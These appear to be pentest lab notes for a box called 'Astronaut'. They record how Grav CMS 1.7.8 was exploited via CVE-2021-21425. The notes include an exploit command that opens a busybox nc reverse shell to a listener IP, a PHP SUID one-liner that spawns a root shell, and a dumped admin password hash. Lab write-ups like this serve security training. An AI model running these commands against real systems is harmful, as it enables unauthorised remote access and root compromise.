# Astronaut \[Easy]

## Report

grav-cms is vulnerable to an authenticated RCE that gets us a reverse shell, PHP can be run as SUID which gets us root.

## Cheatsheet

```
https://github.com/CsEnox/CVE-2021-21425/tree/main
python3 exploit.py -t 'http://192.168.178.12/grav-admin' -c 'busybox nc 192.168.45.234 8000 -e /bin/sh'
```

## Loot

### Enumeration

192.168.178.12

grav-cms : version: 1.7.8 \[ after webshell]

### Attack Vectors

Scheduler feature of admin in grav-cms is abused here, that's why we have to wait a minute for exploit to run and why you shouldn't modify it either

### PrivEsc

php can be run as SUID

```
CMD="/bin/sh"
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```

### Creds

admin:$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.

### Proof

{% embed url="https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/" %}
